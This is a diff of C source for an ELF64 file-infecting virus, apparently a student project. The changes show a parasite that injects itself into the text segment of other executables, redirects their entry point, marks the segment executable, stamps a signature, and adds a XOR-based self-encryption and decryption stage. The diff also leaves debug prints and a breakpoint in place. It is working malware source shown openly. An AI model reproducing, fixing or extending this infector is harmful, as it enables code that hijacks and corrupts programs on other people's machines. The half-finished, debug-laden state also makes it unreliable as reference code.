@@ -13,7 +13,7 @@
 #include <string.h>
 
 # include <stdio.h> // DELL printfs
-# define SIZE_BEFORE_ENTRY_POINT 62
+# define SIZE_BEFORE_ENTRY_POINT (62 + 2 * sizeof(size_t))
 
 typedef struct	s_file
 {
@@ -122,7 +122,7 @@ _start()
 {
 	__asm__(".globl real_start\n"
 	        "real_start:\n"
-	       // "int3\n"
+	       "int3\n"
             "pushq %rax\n"
 			"pushq %rbx\n"
 			"pushq %rcx\n"
@@ -161,6 +161,7 @@ int do_main(void)
 //	pid = fork();
 	//if (pid == 0) //children
 //	{
+		decrypter(get_eip() - ((char *)&yeah - (char *)&real_start));
 		main_encrypt();
 		//decrypt
 
@@ -382,15 +383,23 @@ void decrypter(unsigned long address_of_main)
 	size_t	offset;
 	char	*start;
 
-	offset = *(int *)(address_of_main - 4 + sizeof(offset));
-	size = *(int *)(address_of_main - 4);
+	// __asm__("int3");
+	offset = *(size_t *)(address_of_main - (sizeof(offset) * 2));
+	size = *(size_t *)(address_of_main - sizeof(offset));
+	ft_putchar('\n');
+	ft_putnbr(offset);
+	ft_putchar('\n');
+	ft_putnbr(size);
+	ft_putchar('\n');
+	start = address_of_main + offset;
+	offset = 0;
 	if(size && im_infected(address_of_main))
 	{
-		start[offset] ^= *(int *)(address_of_main - 4);
+		start[offset] ^= 56;//*(int *)(address_of_main - 4);
 		offset++;
 		while (offset < size)
 		{
-			start[offset] ^= start[offset - 1];
+			start[offset] ^= 56;//start[offset - 1];
 			offset++;
 		}
 	}
@@ -792,7 +801,7 @@ int do_the_job(char buff[],size_t size, char *path)
 	ft_putstr(debut);
 	//printf("debut do_the_job\n");
 
-	unsigned int payload_len = ((char *)&myend - (char *)&real_start )+ SIZE_BEFORE_ENTRY_POINT;
+	unsigned int payload_len = ((char *)&myend - (char *)&real_start ) + SIZE_BEFORE_ENTRY_POINT;
 ft_putnbr(payload_len);
 ft_putchar('\n');
 	Elf64_Addr parasite_vaddr;
@@ -874,7 +883,7 @@ ft_putchar('\n');
 			text = phdr[i].p_offset;
 			text_end = phdr[i].p_offset + phdr[i].p_filesz;
 			payload_vaddr = phdr[i].p_vaddr + phdr[i].p_filesz;
-			hdr->e_entry = payload_vaddr + 63;
+			hdr->e_entry = payload_vaddr + SIZE_BEFORE_ENTRY_POINT;
 			phdr[i].p_filesz += payload_len +100;
 			phdr[i].p_memsz += payload_len + 100;
 			phdr[i].p_flags |= PF_X;
@@ -1001,9 +1010,25 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 	unsigned long address_of_start_encrypt = get_eip() - ((char *)&yeah - (char *)&main_encrypt);
 
 	size_t size_wrote = 0;
+	size_t	value;
 	ft_putchar('6');
 	ft_putchar('\n');
+	
 	size_wrote =	put_sig(fd);
+	
+	ft_putchar('\n');
+	
+	value = (address_of_start_encrypt - address_of_start);
+	size_wrote += write(fd, (char *)(&value), sizeof(size_t));
+	
+	ft_putnbr(value);
+	ft_putchar('\n');
+	
+	value = parasite_size - 7 - (address_of_start_encrypt - address_of_start);
+	size_wrote += write(fd, (char *)(&value), sizeof(size_t));
+	
+	ft_putnbr(value);
+	ft_putchar('\n');
 
 	ft_putchar('7');
 	ft_putchar('\n');
@@ -1013,8 +1038,8 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 	 //size_wrote += write(fd,"\xcc",1);
 	ft_putchar('8');
 	ft_putchar('\n');
-	size_wrote += write(fd,(char *) address_of_start, parasite_size - 7);
-	//size_wrote += crypter(address_of_start_encrypt, parasite_size - 7 - (address_of_start_encrypt - address_of_start) , 56, fd);
+	size_wrote += write(fd,(char *) address_of_start, (address_of_start_encrypt - address_of_start));
+	size_wrote += crypter((char *)address_of_start_encrypt, parasite_size - 7 - (address_of_start_encrypt - address_of_start) , 56, fd);
 	ft_putchar('9');
 	ft_putchar('\n');
 	size_wrote += write(fd,jmp_code,7);
@@ -1340,7 +1365,7 @@ size_t	put_sig(int fd)
 	sig[51]=' ';
 	sig[52]='-';
 	sig[53]=' ';
-	char fingerprint[9];
+	char fingerprint[8];
 	fingerprint[0]= '0';
 	fingerprint[1]='0';
 	fingerprint[2]='0';
@@ -1349,7 +1374,6 @@ size_t	put_sig(int fd)
 	fingerprint[5]='0';
 	fingerprint[6]='0';
 	fingerprint[7]='0';
-	fingerprint[8]=0;
 	int i;
 	size_t size;
 	unsigned long address_of_main = get_eip() - ((char *)&yeah - (char *)&real_start);
@@ -1410,7 +1434,7 @@ size_t i ;
 		{
 		// 	ft_putnbr(size);
 		// ft_putstr("\\");
-			tab[size % 2] = (read[size] ^ tab[(size - 1) % 2]);
+			tab[size % 2] = (read[size] ^ 56);// tab[(size - 1) % 2]);
 			i += write(fd, &(tab[size % 2]), 1);
 			lseek(fd, (off_t)-2, SEEK_CUR);
 			size--;
@@ -1419,7 +1443,7 @@ size_t i ;
 		i += write(fd, &(tab[size % 2]), 1);
 		// ft_putstr("bite\n");
 		lseek(fd, (off_t)0, SEEK_END);
-		ft_putnbr(lseek(fd, (off_t)0, SEEK_END));
+		// ft_putnbr(lseek(fd, (off_t)0, SEEK_END));
 		// ft_putstr("\n");
 		size--;
 		return (i);
